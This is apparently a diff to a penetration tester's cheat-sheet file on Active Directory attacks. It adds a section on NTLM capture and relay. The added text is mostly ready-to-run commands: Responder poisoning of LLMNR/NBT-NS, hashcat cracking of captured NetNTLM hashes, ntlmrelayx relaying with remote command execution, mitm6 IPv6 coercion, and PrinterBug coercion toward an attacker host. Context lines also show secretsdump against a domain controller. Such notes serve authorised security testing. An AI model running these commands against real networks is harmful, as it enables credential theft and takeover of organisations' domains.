@@ -11,7 +11,7 @@ Credential theft, Kerberos abuse, ACL exploitation, and domain credential dumpin
 active-directory.txt     Domain recon and enumeration
 ad-bloodhound.txt        SharpHound and path analysis
 ldap-owa.txt             Password spraying
-passwords.txt            Offline hash cracking
+passwords.txt            Wordlists and offline hash cracking
 windows-credentials.txt  LSASS dumping on member hosts
 windows-lateral.txt      Pass-the-hash after hash extraction
 
@@ -184,3 +184,45 @@ secretsdump.py -no-pass -just-dc <domain>/<dc-hostname>\$@<dc-ip>
 
 zerologon_tester VULNERABLE requires patch verification on the DC — patched systems return safe status.
 Reset machine account password carefully — improper exploitation can break DC secure channel.
+
+
+# NTLM Capture and Relay
+
+## Overview
+
+Poison LLMNR, NBT-NS, or mDNS responses to capture NetNTLM hashes, or relay authentication to hosts without SMB signing. Crack captured hashes with passwords.txt.
+
+## Commands
+
+Responder (capture hashes):
+    vi /etc/responder/Responder.conf
+    # Set SMB and HTTP to Off when relaying; On when capturing only
+    responder -I eth0 -A
+    responder -I eth0 -rdwP
+
+Crack captured hashes:
+    See passwords.txt — hashcat -m 5600
+
+NTLM relay:
+    impacket-ntlmrelayx -tf targets.txt -smb2support
+    impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
+    impacket-ntlmrelayx -smb2support -t smb://<target B> -c 'whoami /all'
+
+IPv6 coercion:
+    mitm6 -d <domain> --ignore-nofqdn
+
+PrinterBug / PetitPotam coercion (when prerequisites met):
+    dementor.py -u <user> -p <password> -d <domain> <attacker IP> <computer A>
+    https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc
+
+## Prerequisites for relay
+
+Target server does not require SMB signing.
+Captured auth is NetNTLMv1 or NetNTLMv2.
+For coercion paths, identify writable relay targets with BloodHound — see ad-bloodhound.txt.
+
+## Validation / False Positives
+
+Responder hashes that do not crack may still relay — test relay before spending hours on hashcat.
+Analyze mode (-A) confirms poisonable protocols without capturing credentials.
+Relay success requires a signing-disabled SMB target — verify with crackmapexec or nmap scripts.
